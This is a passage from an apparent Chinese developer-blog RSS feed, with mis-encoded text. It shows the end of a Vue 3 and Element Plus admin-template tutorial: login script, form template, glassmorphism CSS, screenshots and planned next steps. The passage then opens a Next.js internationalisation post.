        <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()
        userStore.<span class="hljs-property">token</span> = res.<span class="hljs-property">data</span>.<span class="hljs-property">token</span>

        <span class="hljs-keyword">const</span> userInfo = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUserInfo</span>()
        userStore.<span class="hljs-property">avatar</span> = userInfo.<span class="hljs-property">data</span>.<span class="hljs-property">avatar</span>
        userStore.<span class="hljs-property">username</span> = userInfo.<span class="hljs-property">data</span>.<span class="hljs-property">username</span>
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">success</span>(res.<span class="hljs-property">message</span> || <span class="hljs-string">'ç™»å½•æˆåŠŸ'</span>)
        router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/'</span>)
      } <span class="hljs-keyword">finally</span> {
        loading.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
      }
    }
  })
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-bg-animation"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble bubble-1"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble bubble-2"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble bubble-3"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-header"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-container"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-element-plus</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-icon"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-title"</span>&gt;</span>æ¬¢è¿å›æ¥<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-subtitle"</span>&gt;</span>è¯·ç™»å½•æ‚¨çš„è´¦æˆ·ä»¥ç»§ç»­<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">el-form</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"loginFormRef"</span> <span class="hljs-attr">:model</span>=<span class="hljs-string">"loginForm"</span> <span class="hljs-attr">:rules</span>=<span class="hljs-string">"loginRules"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-form"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"large"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">"username"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"loginForm.username"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"ç”¨æˆ·å / é‚®ç®±"</span> <span class="hljs-attr">:prefix-icon</span>=<span class="hljs-string">"undefined"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">prefix</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-user</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-icon"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-input</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">"password"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"loginForm.password"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"å¯†ç "</span> <span class="hljs-attr">show-password</span> @<span class="hljs-attr">keyup.enter</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">prefix</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-lock</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-icon"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-input</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-options"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-checkbox</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"loginForm.rememberMe"</span>&gt;</span>è®°ä½æˆ‘<span class="hljs-tag">&lt;/<span class="hljs-name">el-checkbox</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-link</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">:underline</span>=<span class="hljs-string">"false"</span>&gt;</span>å¿˜è®°å¯†ç ï¼Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">el-link</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">:loading</span>=<span class="hljs-string">"loading"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-button"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleLogin"</span> <span class="hljs-attr">round</span>&gt;</span>
            {{ loading ? 'ç™»å½•ä¸­...' : 'ç™» å½•' }}
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-form</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-footer"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"divider"</span>&gt;</span>æˆ–è€…<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"social-login"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">circle</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-chat-dot-round</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">circle</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-share</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* å®¹å™¨ä¸èƒŒæ™¯ */</span>
<span class="hljs-selector-class">.login-container</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#1a1f38</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#252a4a</span> <span class="hljs-number">100%</span>);
  <span class="hljs-attribute">overflow</span>: hidden;
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Inter'</span>, -apple-system, BlinkMacSystemFont, <span class="hljs-string">'Segoe UI'</span>, Roboto, sans-serif;
}

<span class="hljs-comment">/* åŠ¨æ€èƒŒæ™¯æ°”æ³¡ */</span>
<span class="hljs-selector-class">.login-bg-animation</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">pointer-events</span>: none;
}

<span class="hljs-selector-class">.bubble</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">60px</span>);
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>;
  <span class="hljs-attribute">animation</span>: float <span class="hljs-number">10s</span> infinite ease-in-out;
}

<span class="hljs-selector-class">.bubble-1</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">400px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#409eff</span>;
  <span class="hljs-attribute">top</span>: -<span class="hljs-number">100px</span>;
  <span class="hljs-attribute">left</span>: -<span class="hljs-number">100px</span>;
  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0s</span>;
}

<span class="hljs-selector-class">.bubble-2</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#8e44ad</span>;
  <span class="hljs-attribute">bottom</span>: -<span class="hljs-number">50px</span>;
  <span class="hljs-attribute">right</span>: -<span class="hljs-number">50px</span>;
  <span class="hljs-attribute">animation-delay</span>: -<span class="hljs-number">2s</span>;
}

<span class="hljs-selector-class">.bubble-3</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#2ecc71</span>;
  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">20%</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">30%</span>;
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.4</span>;
  <span class="hljs-attribute">animation-delay</span>: -<span class="hljs-number">5s</span>;
}

<span class="hljs-keyword">@keyframes</span> float {
  <span class="hljs-number">0%</span>,
  <span class="hljs-number">100%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  }
  <span class="hljs-number">50%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">20px</span>, <span class="hljs-number">40px</span>);
  }
}

<span class="hljs-comment">/* ç™»å½•å¡ç‰‡ (Glassmorphism) */</span>
<span class="hljs-selector-class">.login-card</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">420px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">40px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.05</span>);
  backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">20px</span>);
  -webkit-backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">20px</span>);
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">25px</span> <span class="hljs-number">50px</span> -<span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>);
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> ease;
}

<span class="hljs-selector-class">.login-card</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">5px</span>);
  <span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>);
}

<span class="hljs-comment">/* å¤´éƒ¨ */</span>
<span class="hljs-selector-class">.login-header</span> {
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30px</span>;
}

<span class="hljs-selector-class">.logo-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">56px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">56px</span>;
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#409eff</span>, <span class="hljs-number">#337ecc</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">64</span>, <span class="hljs-number">158</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.3</span>);
}

<span class="hljs-selector-class">.logo-icon</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">32px</span>;
  <span class="hljs-attribute">color</span>: white;
}

<span class="hljs-selector-class">.login-title</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.5px</span>;
}

<span class="hljs-selector-class">.login-subtitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.6</span>);
}

<span class="hljs-comment">/* è¡¨å•æ ·å¼è°ƒæ•´ */</span>
:<span class="hljs-built_in">deep</span>(.el-input__wrapper) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
  <span class="hljs-attribute">box-shadow</span>: none <span class="hljs-meta">!important</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}

:<span class="hljs-built_in">deep</span>(.el-input__inner) {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">caret-color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">height</span>: auto;
}

:<span class="hljs-built_in">deep</span>(.el-input__wrapper:hover),
:<span class="hljs-built_in">deep</span>(.el-input__wrapper.is-focus) {
  <span class="hljs-attribute">border-color</span>: <span class="hljs-number">#409eff</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>);
}

<span class="hljs-comment">/* ä¿®å¤æµè§ˆå™¨è‡ªåŠ¨å¡«å……èƒŒæ™¯å˜ç™½é—®é¢˜ */</span>
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill),
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill:hover),
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill:focus),
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill:active) {
  -webkit-text-fill-<span class="hljs-attribute">color</span>: <span class="hljs-number">#ffffff</span> <span class="hljs-meta">!important</span>;
  <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">99999s</span> ease-in-out <span class="hljs-number">0s</span>;
  <span class="hljs-attribute">background-color</span>: transparent <span class="hljs-meta">!important</span>;
}

<span class="hljs-selector-class">.input-icon</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.5</span>);
}

<span class="hljs-selector-class">.form-options</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: space-between;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">24px</span>;
}

:<span class="hljs-built_in">deep</span>(.el-checkbox) {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.7</span>);
}

:<span class="hljs-built_in">deep</span>(.el-checkbox__input.is-checked + .el-checkbox__label) {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#409eff</span>;
}

<span class="hljs-selector-class">.login-button</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">22px</span> <span class="hljs-number">0</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">1px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#409eff</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#0077ff</span> <span class="hljs-number">100%</span>);
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">14px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">64</span>, <span class="hljs-number">158</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.39</span>);
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}

<span class="hljs-selector-class">.login-button</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.02</span>);
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">6px</span> <span class="hljs-number">20px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">64</span>, <span class="hljs-number">158</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.5</span>);
}

<span class="hljs-comment">/* åº•éƒ¨ */</span>
<span class="hljs-selector-class">.login-footer</span> {
  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">text-align</span>: center;
}

<span class="hljs-selector-class">.divider</span> {
  <span class="hljs-attribute">display</span>: block;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.3</span>);
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
}

<span class="hljs-selector-class">.social-login</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">15px</span>;
}

:<span class="hljs-built_in">deep</span>(.social-login .el-button) {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.7</span>);
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}

:<span class="hljs-built_in">deep</span>(.social-login .el-button:hover) {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>);
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);
}

<span class="hljs-comment">/* ç§»åŠ¨ç«¯é€‚é… */</span>
<span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">480px</span>) {
  <span class="hljs-selector-class">.login-card</span> {
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">30px</span> <span class="hljs-number">20px</span>;
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>ç®€å•æ¨¡æ‹Ÿä¸‹ç™»å½•é€»è¾‘ï¼Œéœ€è¦åœ¨ mock ä¸­åˆ›å»ºæ¨¡æ‹Ÿæ¥å£ï¼Œç„¶ååœ¨ <code>src/api</code> ä¸‹å°è£…è¯·æ±‚å‡½æ•°ï¼Œæœ€ååˆ°ç›¸å…³ç»„ä»¶ä¸­è¿›è¡Œè°ƒç”¨</p>
<h3 data-id="heading-16">æ•ˆæœ</h3>
<p>ç™»å½•é¡µï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c96f4f350c4f4794aacd3ebe1814b46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5oyW5Zyf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461042&amp;x-signature=dlmf09dsScI9Eth74gBdK4L90QY%3D" alt="login.png" loading="lazy"/></p>
<p>å¸ƒå±€é¦–é¡µï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c34032d74ec48fba9e1739f37f80586~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5oyW5Zyf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461042&amp;x-signature=ePvMbWDlUvGS6S1XEDYKPYytkj8%3D" alt="layout.png" loading="lazy"/></p>
<p>æ„Ÿè§‰æ¯”æˆ‘å†™å¾—å¥½ã€‚ã€‚ä¸æƒ³ä¸¸è¾£</p>
<h3 data-id="heading-17">åç»­</h3>
<p>å¦‚æœè¿˜æœ‰åç»­çš„è¯ã€‚ã€‚</p>
<ul>
<li>ä½¿ç”¨ Nest.js æ­å»ºä¸€ä¸ªæƒé™ç³»ç»Ÿåç«¯</li>
<li>å·¦ä¾§è·¯ç”±èœå•æ ¹æ®æƒé™ç³»ç»Ÿè¿”å›å†…å®¹åŠ¨æ€ç”Ÿæˆ</li>
<li>å®Œå–„é¡µé¢åŸºç¡€å†…å®¹</li>
<li>å›¢é˜Ÿåä½œï¼šä»£ç é£æ ¼ç»Ÿä¸€ä¸ git æäº¤è§„èŒƒ</li>
</ul>
<p>æºç ä¼šæäº¤åˆ°è¿™ä¸ªåœ°å€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FsingleGou%2Felementplus-js-admin" target="_blank" title="https://github.com/singleGou/elementplus-js-admin" ref="nofollow noopener noreferrer">elementplus-js-admin</a>ï¼Œæ¬¢è¿ spa</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js å›½é™…åŒ–å®ç°æ–¹æ¡ˆè¯¦è§£]]></title>    <link>https://juejin.cn/post/7583971282892685364</link>    <guid>https://juejin.cn/post/7583971282892685364</guid>    <pubDate>2025-12-16T04:00:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583971282892685364" data-draft-id="7583973472323371023" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js å›½é™…åŒ–å®ç°æ–¹æ¡ˆè¯¦è§£"/> <meta itemprop="keywords" content="å‰ç«¯,Next.js"/> <meta itemprop="datePublished" content="2025-12-16T04:00:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°‘å¿"/> <meta itemprop="url" content="https://juejin.cn/user/26044010879709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js å›½é™…åŒ–å®ç°æ–¹æ¡ˆè¯¦è§£
